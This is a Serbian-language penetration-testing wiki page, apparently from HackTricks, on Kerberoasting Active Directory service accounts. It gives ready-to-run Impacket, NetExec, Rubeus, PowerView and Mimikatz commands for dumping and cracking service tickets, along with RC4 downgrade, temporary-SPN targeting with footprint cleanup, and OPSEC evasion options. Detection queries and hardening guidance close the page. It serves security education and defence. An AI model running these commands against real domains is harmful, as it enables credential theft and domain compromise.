# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se fokusira na pribavljanje TGS ticket-a, konkretno onih povezanih sa servisima koji rade pod korisničkim nalozima u Active Directory (AD), izuzimajući računare. Enkripcija ovih ticket-a koristi ključeve izvedene iz korisničkih lozinki, što omogućava offline cracking credential-a. Korišćenje korisničkog naloga kao servisa označeno je svojstvom ServicePrincipalName (SPN) koje nije prazno.

Bilo koji autentifikovani korisnik domena može zatražiti TGS ticket-e, tako da nisu potrebne posebne privilegije.<sup>[[4]](#references)[[5]](#references)</sup>

### Ključne tačke

- Ciljaju se TGS ticket-i za servise koji rade pod korisničkim nalozima (tj. nalozima sa podešenim SPN-om; ne računarskim nalozima).
- Ticket-i su enkriptovani ključem izvedenim iz lozinke servisnog naloga i mogu se crack-ovati offline.
- Nisu potrebne povišene privilegije; bilo koji autentifikovani nalog može zatražiti TGS ticket-e.

> [!WARNING]
> Većina javno dostupnih alata preferira zahtev za RC4-HMAC (etype 23) service ticket-ima, jer se brže crack-uju od AES-a. RC4 TGS hash-evi počinju sa `$krb5tgs$23$*`, AES128 sa `$krb5tgs$17$*`, a AES256 sa `$krb5tgs$18$*`. Međutim, mnoga okruženja prelaze na AES-only. Nemojte pretpostaviti da je relevantan samo RC4.
> Takođe, izbegavajte “spray-and-pray” roasting. Rubeus-ov podrazumevani kerberoast može da upita i zatraži ticket-e za sve SPN-ove, što je bučno. Najpre enumerišite i ciljajte zanimljive principe.

### Tajne servisnih naloga i cena Kerberos kriptografije

Mnogi servisi i dalje rade pod korisničkim nalozima sa ručno upravljanim lozinkama. KDC enkriptuje service ticket-e ključevima izvedenim iz tih lozinki i prosleđuje ciphertext bilo kom autentifikovanom principalu, tako da kerberoasting omogućava neograničene offline pokušaje bez lockout-a ili telemetrije sa DC-a. Režim enkripcije određuje cracking budžet:

| Režim | Izvođenje ključa | Tip enkripcije | Približna propusnost RTX 5090* | Napomene |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 sa 4.096 iteracija i salt-om po principalu, generisanim iz domena + SPN-a | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 miliona pokušaja/s | Salt sprečava rainbow tables, ali i dalje omogućava brzo cracking kratkih lozinki. |
| RC4 + NT hash | Jedan MD4 lozinke (unsalted NT hash); Kerberos dodaje samo 8-bajtni confounder po ticket-u | etype 23 (`$krb5tgs$23$`) | ~4.18 **milijardi** pokušaja/s | ~1000× brže od AES-a; napadači forsiraju RC4 kad god `msDS-SupportedEncryptionTypes` to dozvoljava. |

*Benchmark-ovi Chick3nman-a, kako je navedeno u [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

RC4 confounder samo randomizuje keystream; ne dodaje dodatni rad po pokušaju. Ako se servisni nalozi ne oslanjaju na random secrets (gMSA/dMSA, machine accounts ili stringove kojima se upravlja iz vault-a), brzina kompromitovanja zavisi isključivo od GPU budžeta. Enforcing AES-only etype-ova uklanja downgrade od milijardu pokušaja u sekundi, ali slabe ljudske lozinke i dalje padaju pred PBKDF2.<sup>[[3]](#references)</sup>

### Napad

#### Linux

Praktičan end-to-end primer koji koristi NetExec za zahtev roastable ticket-a i Hashcat za njihovo crack-ovanje dostupan je u referenci [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Alati sa više funkcija, uključujući kerberoast provere:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Izlistaj kerberoastable korisnike
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Zatražite TGS i izbacite iz memorije
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tehnika 2: Automatski alati
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS zahtev generiše Windows Security Event 4769 (Zatražen je Kerberos service ticket).

### OPSEC i okruženja koja koriste samo AES

- Namerno zahtevajte RC4 za naloge bez AES-a:
- Rubeus: `/rc4opsec` koristi tgtdeleg za enumeraciju naloga bez AES-a i zahteva RC4 service tickets.
- Rubeus: `/tgtdeleg` sa kerberoast takođe pokreće RC4 zahteve gde je to moguće.<sup>[[6]](#references)</sup>
- Roast-ujte naloge koji koriste samo AES umesto da neprimetno dođe do neuspeha:
- Rubeus: `/aes` enumeriše naloge sa omogućenim AES-om i zahteva AES service tickets (etype 17/18).
- Ako već posedujete TGT (PTT ili iz `.kirbi` datoteke), možete koristiti `/ticket:<blob|path>` sa `/spn:<SPN>` ili `/spns:<file>` i preskočiti LDAP.
- Targetiranje, ograničavanje brzine i manje šuma:
- Koristite `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtrirajte potencijalno slabe lozinke pomoću `/pwdsetbefore:<MM-dd-yyyy>` (starije lozinke) ili targetirajte privilegovane OU-ove pomoću `/ou:<DN>`.<sup>[[8]](#references)</sup>

Primeri (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Ako kontrolišete nalog ili možete da ga menjate, možete ga učiniti kerberoastable dodavanjem SPN-a:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Downgrade naloga za omogućavanje RC4 radi lakšeg crackovanja (zahteva privilegije za upis na ciljni objekat):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast preko GenericWrite/GenericAll nad korisnikom (privremeni SPN)

Kada BloodHound pokaže da imate kontrolu nad objektom korisnika (npr. GenericWrite/GenericAll), možete pouzdano da izvršite „targeted-roast“ nad tim korisnikom čak i ako trenutno nema nijedan SPN:<sup>[[9]](#references)</sup>

- Dodajte privremeni SPN kontrolisanom korisniku kako bi bilo moguće izvršiti roast.
- Zatražite TGS-REP šifrovan pomoću RC4 (etype 23) za taj SPN, kako biste favorizovali cracking.
- Izvršite cracking `$krb5tgs$23$...` hash-a pomoću hashcat-a.
- Uklonite SPN da biste smanjili footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatizuje add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crackujte izlaz pomoću hashcat autodetect (režim 13100 za `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Napomene za detekciju: dodavanje/uklanjanje SPN-ova proizvodi promene u directory-ju (Event ID 5136/4738 na ciljnom user-u), a TGS request generiše Event ID 4769. Razmotrite throttling i prompt cleanup.

Korisne tools za kerberoast attacks možete pronaći ovde: https://github.com/nidem/kerberoast

Ako dobijete ovu grešku na Linux-u: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, uzrok je odstupanje lokalnog vremena. Sinhronizujte vreme sa DC-om:

- `ntpdate <DC_IP>` (deprecated na nekim distribucijama)
- `rdate -n <DC_IP>`

### Kerberoast bez domain naloga (AS-requested STs)

U septembru 2022, Charlie Clark je pokazao da, ako principal ne zahteva pre-authentication, moguće je dobiti service ticket putem posebno kreiranog KRB_AS_REQ-a izmenom sname-a u telu request-a, čime se efektivno dobija service ticket umesto TGT-a. Ovo je slično AS-REP roasting-u i ne zahteva validne domain credentials.

Detalje pogledajte u Semperis write-up-u “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Morate navesti listu user-a jer bez validnih credentials-a ne možete query-ovati LDAP ovom tehnikom.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Povezano

Ako ciljate korisnike podložne AS-REP roastingu, pogledajte i:

{{#ref}}
asreproast.md
{{#endref}}

### Detekcija

Kerberoasting može biti prikriven. Tražite Event ID 4769 sa DC-ova i primenite filtere za smanjenje šuma:

- Isključite naziv servisa `krbtgt` i nazive servisa koji se završavaju sa `$` (computer accounts).
- Isključite zahteve sa machine accounts (`*$$@*`).
- Samo uspešni zahtevi (Failure Code `0x0`).
- Pratite tipove enkripcije: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne generišite alert samo za `0x17`.

Primer PowerShell triage-a:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatne ideje:

- Uspostavite osnovnu vrednost normalne SPN upotrebe po hostu/korisniku; generišite upozorenje na velike nalete različitih SPN zahteva sa jednog principal-a.
- Označite neuobičajenu RC4 upotrebu u AES-ojačanim domenima.

### Ublažavanje / Hardening

- Koristite gMSA/dMSA ili mašinske naloge za servise. Managed accounts imaju nasumične lozinke duže od 120 karaktera i automatski ih rotiraju, zbog čega je offline cracking nepraktičan.<sup>[[7]](#references)</sup>
- Nametnite AES za service accounts postavljanjem `msDS-SupportedEncryptionTypes` na AES-only (decimalno 24 / heksadecimalno 0x18), a zatim rotirajte lozinku kako bi se AES ključevi izveli.<sup>[[7]](#references)</sup>
- Gde je moguće, onemogućite RC4 u svom okruženju i nadgledajte pokušaje korišćenja RC4. Na DC-ovima možete koristiti vrednost registra `DefaultDomainSupportedEncTypes` kako biste usmerili podrazumevane vrednosti za naloge kod kojih `msDS-SupportedEncryptionTypes` nije postavljen. Temeljno testirajte.
- Uklonite nepotrebne SPN-ove sa korisničkih naloga.<sup>[[7]](#references)</sup>
- Koristite duge, nasumične lozinke za service accounts (25+ karaktera) ako managed accounts nisu izvodljivi; zabranite uobičajene lozinke i redovno vršite audit.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking u praksi](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Napadi sa starom Kerberos kriptografijom, male tehničke zahtevnosti i velikog uticaja (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kako napasti Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Zloupotreba Active Directory Kerberos-a: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Zahtevanje RC4-šifrovanog TGS-a kada je AES omogućen](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft-ove smernice za ublažavanje Kerberoasting-a](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Dokumentacija komande Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Novi putevi napada? AS Requested Service Tickets (Charlie Clark, septembar 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
